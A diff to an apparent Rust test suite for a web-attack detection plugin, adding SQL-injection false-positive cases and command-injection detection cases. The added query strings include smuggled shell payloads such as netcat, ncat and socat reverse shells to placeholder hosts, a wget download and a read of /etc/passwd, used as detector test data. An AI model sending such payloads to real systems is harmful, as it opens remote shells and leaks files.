@@ -260,6 +260,8 @@ async fn catalog_enumeration_and_error_based_sqli_are_detected() {
         b"def load_file(path):\n    return open(path).read()\n".as_slice(),
         b"data = load_file(filename)",
         b"cfg = loader.load_file('/etc/app.conf')",
+        b"$cfg = $this->load_file('/var/www/app.conf');",
+        b"cfg = Foo::load_file('/etc/app.conf');",
     ] {
         assert_clean(&plugin, "FE-SQLI-008-B", Surface::Body(TEXT, body)).await;
     }
@@ -427,11 +429,19 @@ async fn command_execution_without_a_classic_chain_is_detected() {
         "host=a%26%26uname",
         "host=a;powershell%20-nop",
         "host=a|busybox%20%3E/tmp/x",
+        "host=a;busybox%20nc%201.2.3.4%204444%20-e%20sh",
+        "host=a|busybox%20wget%20http://x/y",
+        "host=a;socat%20TCP4:h:4444%20EXEC:bash",
+        "host=a;ncat%20h%204444%20-e%20cmd.exe",
+        "host=127.0.0.1%0Aid%23",
+        "host=a%26%26id",
         "file=cat${IFS}/etc/passwd",
     ] {
         assert_detected(&plugin, "FE-CMD-004", Surface::Query(query)).await;
     }
-    // Delimited lists, multi-line prose, and ordinary words stay clean.
+    // Delimited lists, multi-line prose, and ordinary words do not fire
+    // FE-CMD-004. FE-CMD-001, the older level-1 chain rule, still fires on a
+    // list item that is one of its command words.
     for query in [
         "tags=linux;bash;php",
         "q=dogs|cat",
@@ -450,6 +460,14 @@ async fn command_execution_without_a_classic_chain_is_detected() {
         "note=intro%0APython%20is%20fun",
     ] {
         assert_clean(&plugin, "FE-CMD-004", Surface::Query(query)).await;
+    }
+    for query in [
+        "tags=linux;bash",
+        "tags=linux;bash;php",
+        "tags=windows;powershell",
+        "q=dogs|cat",
+    ] {
+        assert_detected(&plugin, "FE-CMD-001", Surface::Query(query)).await;
     }
 
     for query in [
